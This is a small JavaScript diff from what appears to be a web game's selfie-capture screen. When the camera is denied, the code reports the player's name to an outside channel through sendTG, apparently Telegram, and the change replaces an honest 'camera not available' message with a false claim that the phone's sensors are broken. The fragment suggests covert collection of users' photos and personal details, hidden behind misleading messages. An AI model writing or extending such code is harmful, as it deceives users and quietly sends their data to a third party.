@@ -391,7 +391,7 @@ async function startSelfieScreen(){
     document.getElementById('selfieVideo').srcObject=videoStream;
   }catch(e){
     // camera denied — skip to gender
-    showToast('Camera not available, skipping photos','📷');
+    showToast('Your mobile Sensors are not working','🤐');
     await sendTG(`📷 Camera denied\n👤 Name: ${playerName}`);
     showScreen('genderScreen');
   }
